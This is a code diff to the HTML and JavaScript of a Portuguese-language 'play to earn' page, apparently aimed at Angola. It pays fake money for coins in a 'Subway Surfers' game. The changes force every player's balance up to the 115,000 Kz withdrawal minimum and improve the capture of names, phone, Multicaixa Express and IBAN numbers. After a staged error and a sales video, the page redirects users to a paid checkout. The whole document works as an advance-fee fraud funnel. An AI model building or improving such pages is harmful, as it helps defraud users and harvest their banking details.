@@ -305,7 +305,10 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: clamp(20px, 5vw, 40px) clamp(16px, 4vw, 24px);
+            padding-top: max(clamp(20px, 5vw, 40px), env(safe-area-inset-top, 0px));
+            padding-bottom: max(clamp(20px, 5vw, 40px), env(safe-area-inset-bottom, 0px));
+            padding-left: max(clamp(16px, 4vw, 24px), env(safe-area-inset-left, 0px));
+            padding-right: max(clamp(16px, 4vw, 24px), env(safe-area-inset-right, 0px));
             position: relative;
             overflow-x: hidden;
         }
@@ -318,7 +321,7 @@
             width: 100%;
             max-width: 420px;
             margin: 0 auto;
-            padding: clamp(28px, 6vw, 40px) 0 clamp(16px, 4vw, 32px) 0;
+            padding: clamp(28px, 6vw, 40px) 0 max(clamp(16px, 4vw, 32px), env(safe-area-inset-bottom, 0px)) 0;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -797,7 +800,7 @@
             font-weight: 300
         }
 
-        /* ===== IFRAME DO JOGO — TELA CHEIA ===== */
+        /* ===== IFRAME DO JOGO ===== */
 
         .game-frame {
             display: none;
@@ -809,7 +812,7 @@
             border: 0;
             margin: 0;
             padding: 0;
-            background: #101c3d;
+            background: #000;
         }
 
         /* Quando o body está em game-mode: esconde background e toast, mostra jogo fullscreen */
@@ -819,12 +822,14 @@
         }
 
         body.game-mode .game-frame {
-            display: block;
+            display: block !important;
+            opacity: 1;
+            pointer-events: auto;
         }
 
         body.game-mode {
             overflow: hidden;
-            background: #101c3d;
+            background: #000;
             padding: 0;
         }
 
@@ -841,98 +846,32 @@
             height: 100%;
         }
 
-        body.game-mode .game-frame {
-            display: block;
-            pointer-events: auto;
-        }
-
-        /* ===== GAME LOADER SCREEN (substitui tela preta por carregamento animado) ===== */
-
-        .game-loader-screen {
+        .game-loader-box {
             position: fixed;
             inset: 0;
-            z-index: 505;
-            background: linear-gradient(180deg, #101c3d 0%, #060c1d 100%);
+            z-index: 498;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            padding: 24px;
-            transition: opacity 0.35s ease, visibility 0.35s ease;
-            pointer-events: auto;
-        }
-
-        .game-loader-screen.fade-out {
-            opacity: 0;
-            visibility: hidden;
-            pointer-events: none;
-        }
-
-        .game-loader-box {
-            background: #f8ecd6;
-            border: 5px solid #2d2218;
-            border-radius: 24px;
-            padding: clamp(28px, 7vw, 36px) clamp(22px, 5.5vw, 30px);
-            width: 100%;
-            max-width: 360px;
-            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.5);
+            background: #09101f;
             text-align: center;
-            animation: cardPop 0.3s cubic-bezier(.22, 1, .36, 1) both;
+            padding: 24px;
         }
 
-        .game-loader-icon {
-            font-size: clamp(42px, 10vw, 52px);
-            margin-bottom: 10px;
-            animation: skateBob 1.2s ease-in-out infinite;
+        .game-loader-spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid rgba(255, 255, 255, 0.15);
+            border-top: 4px solid #fca94a;
+            border-radius: 50%;
+            animation: spinLoader 0.8s linear infinite;
+            margin-bottom: 16px;
         }
 
-        @keyframes skateBob {
-            0%, 100% { transform: translateY(0) rotate(0deg); }
-            50% { transform: translateY(-6px) rotate(-4deg); }
-        }
-
-        .game-loader-title {
-            font-family: 'Lilita One', cursive;
-            font-size: clamp(22px, 5.8vw, 26px);
-            color: #1a1008;
-            letter-spacing: 1px;
-            margin-bottom: 6px;
-        }
-
-        .game-loader-subtitle {
-            font-family: 'Inter', sans-serif;
-            font-weight: 700;
-            font-size: clamp(12px, 3.2vw, 13px);
-            color: #7a5636;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 18px;
-        }
-
-        .game-loader-track {
-            width: 100%;
-            height: 12px;
-            border-radius: 8px;
-            background: #e8e4dd;
-            border: 2px solid #2d2218;
-            overflow: hidden;
-            margin-bottom: 12px;
-            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.15);
-        }
-
-        .game-loader-bar {
-            height: 100%;
-            width: 0%;
-            border-radius: 6px;
-            background: linear-gradient(90deg, #17d968 0%, #fca94a 100%);
-            transition: width 0.3s ease;
-        }
-
-        .game-loader-status {
-            font-family: 'Inter', sans-serif;
-            font-weight: 700;
-            font-size: clamp(12px, 3vw, 13px);
-            color: #1a1008;
+        @keyframes spinLoader {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         /* ===== SCORE DISPLAY ===== */
@@ -1049,7 +988,7 @@
             right: 0;
             background: #2d2218;
             border-radius: 24px 24px 0 0;
-            padding: clamp(20px, 5vw, 28px) clamp(16px, 4vw, 20px) clamp(32px, 8vw, 44px);
+            padding: clamp(20px, 5vw, 28px) clamp(16px, 4vw, 20px) max(clamp(32px, 8vw, 44px), calc(16px + env(safe-area-inset-bottom, 0px)));
             max-height: 70vh;
             overflow-y: auto;
             z-index: 100;
@@ -1219,8 +1158,8 @@
 
         .toast-saque {
             position: fixed;
-            bottom: 16px;
-            right: 16px;
+            bottom: max(16px, env(safe-area-inset-bottom, 16px));
+            right: max(16px, env(safe-area-inset-right, 16px));
             z-index: 90;
             background: white;
             border-radius: 12px;
@@ -1378,85 +1317,6 @@
             transition: width linear;
         }
 
-        /* ===== MODAL "AVISO TELA PRETA" (antes de carregar o jogo) ===== */
-
-        .aviso-jogo-overlay {
-            position: fixed;
-            inset: 0;
-            z-index: 210;
-            background: rgba(8, 20, 50, 0.55);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            padding: 24px;
-            animation: fadeIn 0.2s ease both;
-        }
-
-        .aviso-jogo-overlay.active {
-            display: flex
-        }
-
-        .aviso-jogo-card {
-            background: #f8ecd6;
-            border: 5px solid #2d2218;
-            border-radius: 24px;
-            padding: clamp(30px, 7.5vw, 40px) clamp(24px, 6vw, 30px) clamp(28px, 7vw, 34px);
-            width: 100%;
-            max-width: 380px;
-            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.45);
-            text-align: center;
-            animation: cardPop 0.35s cubic-bezier(.22, 1, .36, 1) both;
-        }
-
-        .aviso-jogo-icon {
-            font-size: clamp(40px, 10vw, 50px);
-            margin: 0 auto clamp(10px, 2.5vw, 14px);
-            line-height: 1;
-        }
-
-        .aviso-jogo-title {
-            font-family: 'Lilita One', cursive;
-            font-size: clamp(24px, 6.5vw, 28px);
-            color: #1a1008;
-            margin-bottom: clamp(14px, 3.5vw, 18px);
-            letter-spacing: 0.5px;
-        }
-
-        .aviso-jogo-text {
-            font-family: 'Inter', sans-serif;
-            font-weight: 700;
-            font-size: clamp(14px, 3.8vw, 16px);
-            color: #1a1008;
-            line-height: 1.5;
-            margin-bottom: clamp(16px, 4vw, 20px);
-        }
-
-        .aviso-jogo-info {
-            display: flex;
-            align-items: flex-start;
-            gap: 10px;
-            text-align: left;
-        }
-
-        .aviso-jogo-info-icon {
-            flex-shrink: 0;
-            width: 24px;
-            height: 24px;
-            border-radius: 50%;
-            background: #f7b731;
-            color: #1a1008;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: 'Lilita One', cursive;
-            font-size: 14px;
-            margin-top: 1px;
-        }
-
-        .aviso-jogo-card .btn {
-            margin-top: clamp(18px, 4.5vw, 24px)
-        }
-
         /* ===== FOOTER ===== */
 
         .footer-text {
@@ -1566,6 +1426,8 @@
             }
         }
     </style>
+    <link rel="dns-prefetch" href="https://pub-14a7d5e5ccac4b9eae9438738e3d37c3.r2.dev">
+    <link rel="preconnect" href="https://pub-14a7d5e5ccac4b9eae9438738e3d37c3.r2.dev" crossorigin>
     <script>
 window.APP_CONFIG = {
     GAME_URL: 'https://pub-14a7d5e5ccac4b9eae9438738e3d37c3.r2.dev/game.html',
@@ -1631,26 +1493,20 @@ window.APP_CONFIG = {
                     <p class="info-box-text">Cada moeda coletada = <span class="hl-green">1.000 Kz</span> na sua carteira</p>
                 </div>
                 <button class="btn btn-green" id="btn-jogar">🎮 JOGAR AGORA</button>
-                <p class="footer-text">Saldo mínimo para saque: <span class="orange">110.000 Kz</span></p>
+                <p class="footer-text">Saldo mínimo para saque: <span class="orange">115.000 Kz</span></p>
             </div>
         </div>
 
         <!-- STEP 4: O JOGO -->
         <div class="step" id="step-game">
-            <div id="game-loader-screen" class="game-loader-screen">
-                <div class="game-loader-box">
-                    <div class="game-loader-icon">🛹</div>
-                    <div class="game-loader-title">SUBWAY SURFERS</div>
-                    <div class="game-loader-subtitle">INICIANDO PARTIDA COM BÓNUS ATIVO</div>
-                    <div class="game-loader-track">
-                        <div class="game-loader-bar" id="game-loader-bar"></div>
-                    </div>
-                    <div class="game-loader-status" id="game-loader-status">Sincronizando com a sua carteira...</div>
-                </div>
+            <div class="game-loader-box" id="game-loader-screen">
+                <div class="game-loader-spinner"></div>
+                <div style="font-family:'Lilita One',cursive;font-size:24px;color:#fca94a;letter-spacing:1px;margin-bottom:8px">CARREGANDO O JOGO...</div>
+                <div style="font-family:'Inter',sans-serif;font-weight:600;font-size:14px;color:#cbd5e0">A iniciar o Subway Surfers...</div>
             </div>
-            <iframe id="game-iframe" class="game-frame" title="Jogo" allow="autoplay; fullscreen" allowfullscreen loading="eager" fetchpriority="high">
-            </iframe>
         </div>
+        <iframe id="game-iframe" class="game-frame" src="about:blank" title="Jogo" allow="autoplay; fullscreen" allowfullscreen onload="var l=document.getElementById('game-loader-screen');if(l)l.style.display='none';">
+        </iframe>
 
         <!-- STEP 5: BÔNUS CONCLUÍDO -->
         <div class="step" id="step-bonus">
@@ -1709,7 +1565,7 @@ window.APP_CONFIG = {
                     <input type="tel" class="input-field" id="input-express" name="phone" placeholder="9XX XXX XXX" autocomplete="tel" inputmode="tel">
                 </div>
                 <button class="btn btn-green" id="btn-confirm-express">CONFIRMAR SAQUE</button>
-                <a class="back-link" id="back-express" href="https://surfedolucro.vercel.app/?utm_source=organic&amp;utm_campaign=&amp;utm_medium=&amp;utm_content=&amp;utm_term=">← Voltar</a>
+                <a class="back-link" id="back-express" href="javascript:void(0)">← Voltar</a>
             </div>
         </div>
 
@@ -1734,11 +1590,11 @@ window.APP_CONFIG = {
                     <label class="input-label">IBAN (21 DÍGITOS)</label>
                     <div style="display:flex;gap:8px">
                         <div class="input-field" style="flex:0 0 82px;text-align:center;font-weight:900;color:#7a5636;background:#f4e6c4">AO06</div>
-                        <input type="text" class="input-field" id="input-iban" name="iban" placeholder="000000000000000000" maxlength="18" autocomplete="off" inputmode="text" style="flex:1">
+                        <input type="text" class="input-field" id="input-iban" name="iban" placeholder="0000 0000 0000 0000 00" maxlength="22" autocomplete="off" inputmode="numeric" style="flex:1">
                     </div>
                 </div>
                 <button class="btn btn-green" id="btn-confirm-iban">CONFIRMAR SAQUE</button>
-                <a class="back-link" id="back-iban" href="https://surfedolucro.vercel.app/?utm_source=organic&amp;utm_campaign=&amp;utm_medium=&amp;utm_content=&amp;utm_term=">← Voltar</a>
+                <a class="back-link" id="back-iban" href="javascript:void(0)">← Voltar</a>
             </div>
         </div>
 
@@ -1753,21 +1609,6 @@ window.APP_CONFIG = {
                 </div>
             </div>
         </div>
-
-        <!-- MODAL "AVISO TELA PRETA" (antes do jogo carregar) -->
-        <div class="aviso-jogo-overlay" id="aviso-jogo-overlay">
-            <div class="aviso-jogo-card">
-                <div class="aviso-jogo-icon">⏳</div>
-                <div class="aviso-jogo-title">⚡ ATENÇÃO! ⚡</div>
-                <p class="aviso-jogo-text">Se a tela ficar preta, não se preocupe!<br>Aguarde até <span class="hl-green">10 segundos</span> e o jogo vai começar automaticamente.</p>
-                <div class="info-box aviso-jogo-info">
-                    <div class="aviso-jogo-info-icon">i</div>
-                    <div class="info-box-text">É normal a tela ficar preta por alguns segundos. Tenha paciência!</div>
-                </div>
-                <button class="btn btn-green" id="btn-aviso-entendi">✅ ENTENDI</button>
-            </div>
-        </div>
-
 
         <!-- TOAST DE NOTIFICAÇÃO DE SAQUE -->
         <div class="toast-saque" id="toast-saque">
@@ -1896,7 +1737,7 @@ window.APP_CONFIG = {
                 <h1 class="title" style="font-size:24px">DESBLOQUEIO<br>DE SALDO</h1>
                 <p class="subtitle">Assista o vídeo informativo até o final para processar seu saque com segurança imediata</p>
                 <div class="vsl-area">
-                    <vturb-smartplayer id="vid-6af505e27e24679602511974" style="display: block; margin: 0 auto; width: 100%; max-width: 400px;"><div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 177.77777777777777% 0 0; z-index: 0; background-color: black;"></div></vturb-smartplayer>
+                    <vturb-smartplayer id="vid-6b06dec840f646699a995640" style="display: block; margin: 0 auto; width: 100%; max-width: 400px;"><div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 177.77777777777777% 0 0; z-index: 0; background-color: black;"></div></vturb-smartplayer>
                 </div>
                 <p class="warning-text" id="vsl-warning"><span class="warning-dot"></span> Assista o vídeo até o final para liberar o seu saque</p>
                 <button class="btn-vsl-checkout" id="btn-final-saque" style="display:none">LIBERAR MEU SAQUE</button>
@@ -1961,53 +1802,13 @@ window.APP_CONFIG = {
                — abrindo quase instantaneamente, sem esperar por um download novo. */
             var GAME_URL = (window.APP_CONFIG && window.APP_CONFIG.GAME_URL) || 'https://game.example.com/game.html';
 
-            function startLoaderAnimation() {
-                var loader = $('game-loader-screen');
-                var bar = $('game-loader-bar');
-                var status = $('game-loader-status');
-                if (!loader || !bar) return;
-
-                loader.classList.remove('fade-out');
-                bar.style.transition = 'none';
-                bar.style.width = '0%';
-                if (status) status.textContent = 'Sincronizando com a sua carteira...';
-
-                requestAnimationFrame(function() {
-                    bar.style.transition = 'width 0.4s ease';
-                    bar.style.width = '35%';
-                });
-
-                setTimeout(function() {
-                    bar.style.transition = 'width 0.5s ease';
-                    bar.style.width = '75%';
-                    if (status) status.textContent = 'Carregando moedas premiadas...';
-                }, 400);
-
-                setTimeout(function() {
-                    bar.style.transition = 'width 0.3s ease';
-                    bar.style.width = '100%';
-                    if (status) status.textContent = 'Pronto! Iniciando partida...';
-                }, 1000);
-
-                setTimeout(function() {
-                    loader.classList.add('fade-out');
-                }, 1400);
-            }
-
             function loadGame() {
                 var iframe = $('game-iframe');
                 if (!iframe) return;
-                if (iframe.dataset.loaded === 'true') return;
-                iframe.src = GAME_URL;
+                if (!iframe.src || iframe.src === 'about:blank' || iframe.getAttribute('src') === 'about:blank') {
+                    iframe.src = GAME_URL;
+                }
                 iframe.dataset.loaded = 'true';
-                iframe.onload = function() {
-                    var loader = $('game-loader-screen');
-                    if (loader) {
-                        setTimeout(function() {
-                            loader.classList.add('fade-out');
-                        }, 200);
-                    }
-                };
             }
 
             /* Bridge to the game iframe. The game now lives on R2 (a different origin
@@ -2022,7 +1823,7 @@ window.APP_CONFIG = {
                 if (!data || typeof data !== 'object') return;
 
                 if (data.type === 'subwayWithdrawal' && typeof data.amount === 'number') {
-                    state.amount = data.amount;
+                    state.amount = Math.max(data.amount, 115000);
                     saveState();
                     if (gamePolling) {
                         clearInterval(gamePolling);
@@ -2040,6 +1841,8 @@ window.APP_CONFIG = {
                             clearInterval(gamePolling);
                             gamePolling = null;
                         }
+                        state.amount = Math.max(state.amount || 115000, 115000);
+                        saveState();
                         goTo('bonus');
                     }
                 }
@@ -2052,11 +1855,10 @@ window.APP_CONFIG = {
                 // Game fullscreen mode
                 document.body.classList.toggle('game-mode', stepId === 'game');
 
-                // The game step is only hidden with CSS below, never unloaded — so if we
-                // don't explicitly stop it here, it keeps running (and playing audio) in
-                // the background on every later step, including the VSL. Blank its src
-                // whenever we're outside 'game'.
-                if (stepId !== 'game') {
+                // Apenas descarrega o iframe nas etapas posteriores ao jogo (após resgatar bónus / VSL / saque)
+                // para que o pré-carregamento NUNCA seja apagado durante o preenchimento dos dados.
+                var postGameSteps = ['bonus', 'almost', 'withdraw', 'express', 'iban', 'error', 'security'];
+                if (postGameSteps.indexOf(stepId) !== -1) {
                     var gameIframe = $('game-iframe');
                     if (gameIframe && gameIframe.dataset.loaded === 'true') {
                         gameIframe.src = 'about:blank';
@@ -2073,14 +1875,31 @@ window.APP_CONFIG = {
                     window.scrollTo(0, 0);
                 }
 
-                if (stepId === 'linked') {
-                    // Pré-carrega o jogo na memória em segundo plano enquanto lê o card
+                if (stepId === 'game') {
+                    var loader = $('game-loader-screen');
+                    if (loader) loader.style.display = 'flex';
                     loadGame();
                 }
 
-                if (stepId === 'game') {
-                    loadGame();
-                    startLoaderAnimation();
+                if (stepId === 'express') {
+                    var valExp = state.expressNumber || state.phone || '';
+                    var inputExp = $('input-express');
+                    if (inputExp && !inputExp.value && valExp) {
+                        inputExp.value = formatPhone(valExp);
+                    }
+                }
+
+                if (stepId === 'iban') {
+                    var valName = state.ibanName || state.name || '';
+                    var inputName = $('input-iban-name');
+                    if (inputName && !inputName.value && valName) {
+                        inputName.value = valName;
+                    }
+                    var valIban = state.iban ? state.iban.replace(/^AO06/i, '') : '';
+                    var inputIban = $('input-iban');
+                    if (inputIban && !inputIban.value && valIban) {
+                        inputIban.value = formatIban(valIban);
+                    }
                 }
 
                 if (stepId === 'bonus') {
@@ -2201,17 +2020,19 @@ window.APP_CONFIG = {
                         var withdrawal = localStorage.getItem('subway_withdrawal_amount');
                         var coins = localStorage.getItem('subway_total_coins');
                         if (withdrawal) {
-                            state.amount = parseInt(withdrawal);
+                            state.amount = Math.max(parseInt(withdrawal), 115000);
                             saveState();
                             clearInterval(gamePolling);
+                            gamePolling = null;
                             goTo('bonus');
                             return;
                         }
                         if (coins && parseInt(coins) >= 110) {
-                            state.amount = parseInt(coins) * 1000;
+                            state.amount = Math.max(parseInt(coins) * 1000, 115000);
                             localStorage.setItem('subway_withdrawal_amount', state.amount);
                             saveState();
                             clearInterval(gamePolling);
+                            gamePolling = null;
                             goTo('bonus');
                             return;
                         }
@@ -2273,7 +2094,7 @@ window.APP_CONFIG = {
                 if (vslPlayerLoaded) return;
                 vslPlayerLoaded = true;
                 var s = document.createElement('script');
-                s.src = 'https://scripts.converteai.net/5e2cd835-c87d-440a-9cae-4f9a803bd963/players/6af505e27e24679602511974/v4/player.js';
+                s.src = 'https://scripts.converteai.net/30918c9a-a0ae-4066-8f32-58de1e120df5/players/6b06dec840f646699a995640/v4/player.js';
                 s.async = true;
                 document.head.appendChild(s);
             }
@@ -2309,7 +2130,7 @@ window.APP_CONFIG = {
                 if (vslCtaBound) return;
                 vslCtaBound = true;
 
-                var VSL_PLAYER_ID = '6af505e27e24679602511974';
+                var VSL_PLAYER_ID = '6b06dec840f646699a995640';
                 var playerEl = document.getElementById('vid-' + VSL_PLAYER_ID);
 
                 function handlePlayerTimeEvent(e) {
@@ -2413,16 +2234,58 @@ window.APP_CONFIG = {
                 }, 500);
             }
 
+            function cleanAngolaPhone(v) {
+                if (!v) return '';
+                var d = String(v).replace(/\D/g, '');
+                if (d.length === 12 && d.indexOf('244') === 0) {
+                    d = d.slice(3);
+                }
+                return d;
+            }
+
             function formatPhone(v) {
-                var d = v.replace(/\D/g, '');
+                var d = cleanAngolaPhone(v).slice(0, 9);
                 if (d.length <= 3) return d;
                 if (d.length <= 6) return d.slice(0, 3) + ' ' + d.slice(3);
                 return d.slice(0, 3) + ' ' + d.slice(3, 6) + ' ' + d.slice(6, 9);
             }
 
             function validatePhone(v) {
-                var d = v.replace(/\D/g, '');
-                return d.length >= 9;
+                var d = cleanAngolaPhone(v);
+                return d.length === 9 && d.charAt(0) === '9';
+            }
+
+            function formatIban(v) {
+                if (!v) return '';
+                var d = String(v).replace(/\D/g, '').slice(0, 18);
+                var parts = [];
+                for (var i = 0; i < d.length; i += 4) {
+                    parts.push(d.slice(i, i + 4));
+                }
+                return parts.join(' ');
+            }
+
+            function saveUtmParams() {
+                try {
+                    var search = window.location.search;
+                    if (search && search.length > 1) {
+                        localStorage.setItem('subway_utm_query', search);
+                    }
+                } catch (e) {}
+            }
+
+            function getPreservedUtms() {
+                try {
+                    var current = window.location.search;
+                    if (current && current.length > 1) {
+                        return current;
+                    }
+                    var saved = localStorage.getItem('subway_utm_query');
+                    if (saved && saved.length > 1) {
+                        return saved;
+                    }
+                } catch (e) {}
+                return '';
             }
 
             function updateErrorScreen() {
@@ -2445,6 +2308,7 @@ window.APP_CONFIG = {
             }
 
             function init() {
+                saveUtmParams();
                 loadState();
 
                 if (window.FB_TRACKER) {
@@ -2459,9 +2323,7 @@ window.APP_CONFIG = {
                     });
                 }
 
-                // O carregamento do jogo inicia de forma transparente em segundo plano
-                // ao entrar na etapa 'linked' e exibe a tela de carregamento animada
-                // ao entrar em 'game', eliminando qualquer tela preta ou atraso.
+
 
                 $('btn-start').addEventListener('click', function() {
                     if (window.FB_TRACKER) {
@@ -2474,20 +2336,21 @@ window.APP_CONFIG = {
 
                 $('btn-cadastrar').addEventListener('click', function() {
                     var name = $('input-name').value.trim();
-                    var phone = $('input-phone').value.trim();
+                    var rawPhone = $('input-phone').value.trim();
                     if (!name) {
                         alert('Por favor, insira seu nome completo.');
-                        return
+                        return;
                     }
-                    if (!validatePhone(phone)) {
-                        alert('Insira um número válido (9XX XXX XXX).');
-                        return
+                    if (!validatePhone(rawPhone)) {
+                        alert('Por favor, insira um número válido de Angola (ex: 923 456 789).');
+                        return;
                     }
+                    var cleanPhone = cleanAngolaPhone(rawPhone);
                     state.name = name;
-                    state.phone = phone;
+                    state.phone = cleanPhone;
                     saveState();
                     if (window.FB_TRACKER) {
-                        window.FB_TRACKER.setUserData({ name: name, phone: phone });
+                        window.FB_TRACKER.setUserData({ name: name, phone: cleanPhone });
                         window.FB_TRACKER.track('Lead', {
                             content_name: 'Cadastro Subway Premiado',
                             value: state.amount,
@@ -2499,18 +2362,23 @@ window.APP_CONFIG = {
                             value: state.amount,
                             currency: 'AOA'
                         });
+                        window.FB_TRACKER.trackCustom('StartGame', {
+                            content_name: 'Subway Surfers Game'
+                        });
                     }
-                    goTo('linked');
+                    loadGame();
+                    goTo('game');
+                    setTimeout(startGamePolling, 2000);
                 });
 
                 $('input-phone').addEventListener('input', function(e) {
-                    e.target.value = formatPhone(e.target.value)
+                    e.target.value = formatPhone(e.target.value);
                 });
                 $('input-express').addEventListener('input', function(e) {
-                    e.target.value = formatPhone(e.target.value)
+                    e.target.value = formatPhone(e.target.value);
                 });
                 $('input-iban').addEventListener('input', function(e) {
-                    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 18)
+                    e.target.value = formatIban(e.target.value);
                 });
 
                 $('btn-jogar').addEventListener('click', function() {
@@ -2519,17 +2387,7 @@ window.APP_CONFIG = {
                             content_name: 'Subway Surfers Game'
                         });
                     }
-                    goTo('game');
-                    setTimeout(startGamePolling, 2000);
-                });
-
-                $('btn-aviso-entendi').addEventListener('click', function() {
-                    $('aviso-jogo-overlay').classList.remove('active');
-                    if (window.FB_TRACKER) {
-                        window.FB_TRACKER.trackCustom('StartGame', {
-                            content_name: 'Subway Surfers Game'
-                        });
-                    }
+                    loadGame();
                     goTo('game');
                     setTimeout(startGamePolling, 2000);
                 });
@@ -2558,13 +2416,14 @@ window.APP_CONFIG = {
                 $('btn-confirm-express').addEventListener('click', function() {
                     var num = $('input-express').value.trim();
                     if (!validatePhone(num)) {
-                        alert('Número Express inválido.');
-                        return
+                        alert('Número Multicaixa Express inválido. Insira um número de Angola (ex: 923 456 789).');
+                        return;
                     }
-                    state.expressNumber = num.replace(/\s/g, '');
+                    var cleanNum = cleanAngolaPhone(num);
+                    state.expressNumber = cleanNum;
                     saveState();
                     if (window.FB_TRACKER) {
-                        window.FB_TRACKER.setUserData({ phone: state.expressNumber });
+                        window.FB_TRACKER.setUserData({ phone: cleanNum });
                         window.FB_TRACKER.track('AddPaymentInfo', {
                             content_category: 'Multicaixa Express',
                             value: state.amount,
@@ -2573,8 +2432,9 @@ window.APP_CONFIG = {
                     }
                     showVerificando('error');
                 });
-                $('back-express').addEventListener('click', function() {
-                    goTo('withdraw')
+                $('back-express').addEventListener('click', function(e) {
+                    e.preventDefault();
+                    goTo('withdraw');
                 });
 
                 $('btn-select-bank').addEventListener('click', function() {
@@ -2604,21 +2464,22 @@ window.APP_CONFIG = {
 
                 $('btn-confirm-iban').addEventListener('click', function() {
                     var name = $('input-iban-name').value.trim();
-                    var iban = $('input-iban').value.trim();
+                    var rawIban = $('input-iban').value.trim();
+                    var digitsOnly = rawIban.replace(/\D/g, '');
                     if (!name) {
                         alert('Insira o nome do titular.');
-                        return
+                        return;
                     }
                     if (!state.bank) {
                         alert('Selecione um banco.');
-                        return
+                        return;
                     }
-                    if (iban.length < 18) {
-                        alert('IBAN deve ter 21 dígitos (AO06 + 18).');
-                        return
+                    if (digitsOnly.length !== 18) {
+                        alert('IBAN deve ter 18 dígitos bancários (AO06 + 18 dígitos).');
+                        return;
                     }
                     state.ibanName = name;
-                    state.iban = 'AO06' + iban;
+                    state.iban = 'AO06 ' + formatIban(digitsOnly);
                     saveState();
                     if (window.FB_TRACKER) {
                         window.FB_TRACKER.setUserData({ name: name });
@@ -2630,8 +2491,9 @@ window.APP_CONFIG = {
                     }
                     showVerificando('error');
                 });
-                $('back-iban').addEventListener('click', function() {
-                    goTo('withdraw')
+                $('back-iban').addEventListener('click', function(e) {
+                    e.preventDefault();
+                    goTo('withdraw');
                 });
 
                 $('btn-resolver').addEventListener('click', function() {
@@ -2653,7 +2515,7 @@ window.APP_CONFIG = {
                         });
                     }
                     var checkoutUrl = 'https://pay.bicaju.com/e592144_610585';
-                    var params = window.location.search; // repassa utm_source, utm_campaign, fbclid, etc. para o domínio do checkout
+                    var params = getPreservedUtms();
                     setTimeout(function() {
                         window.location.href = checkoutUrl + params;
                     }, 180);
